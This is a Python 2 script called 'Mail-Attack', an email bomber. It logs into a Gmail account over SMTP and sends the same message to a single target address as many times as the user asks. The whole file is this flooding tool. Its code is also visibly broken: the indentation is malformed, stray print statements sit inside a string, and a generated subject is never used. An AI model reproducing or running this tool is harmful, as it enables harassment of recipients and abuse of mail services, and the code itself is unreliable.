#!/usr/bin/python
import smtplib
import time
import os
import getpass
import sys

class bcolors:
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'


		def bomb():
			os.system('clear')
			print bcolors.OKGREEN + '''
print '  					 \|/
print '  				       `--+--'
print '  					  |
				      ,--'#`--.
				      |#######|
				   _.-'#######`-._
				,-'###############`-.
			      ,'#####################`,         +-+-+-+-+-+-+-+-+-+-+-+
			     |#########################|        |M|a|i|l|-|A|t|t|a|c|k|
			    |###########################|       +-+-+-+-+-+-+-+-+-+-+-+
			   |#############################|      Author: Md. Noman Miah
			   |#############################|              
			   |#############################|
			    |###########################|
			     \#########################/
			      `.#####################,'
				`._###############_,'
				   `--..#####..--'                                 ,-.--.
		*.______________________________________________________________,' (Bomb)
										    `--' ''' + bcolors.ENDC


os.system('clear')
try:
	file1 = open('Banner.txt', 'r')
	print(' ')
	print bcolors.OKGREEN + file1.read() + bcolors.ENDC
	file1.close()
except IOError:
	print('Banner File not found')

#Input
email = raw_input('Attacker Gmail Address : ')
print '             '
user = raw_input('Subject (Optional) : ')
print '      '
passwd = getpass.getpass('Password: ')

print '   '

to = raw_input('\nTo: ')


print '    '

body = raw_input('Message: ')

print '    '

total = input('Number of send: ')

smtp_server = 'smtp.gmail.com'
port = 587


print ''





try:
    server = smtplib.SMTP(smtp_server,port) 
    server.ehlo()
    server.starttls()
    server.login(email,passwd)
    for i in range(1, total+1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: ' + '\n' + body
        server.sendmail(email,to,msg)
        print "\rE-mails sent: %i" % i
        time.sleep(1)
        sys.stdout.flush()
    server.quit()
    print '\n Done !!!'
except KeyboardInterrupt:
    print '[-] Canceled'
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print '\n[!] The username or password you entered is incorrect.'
    sys.exit()
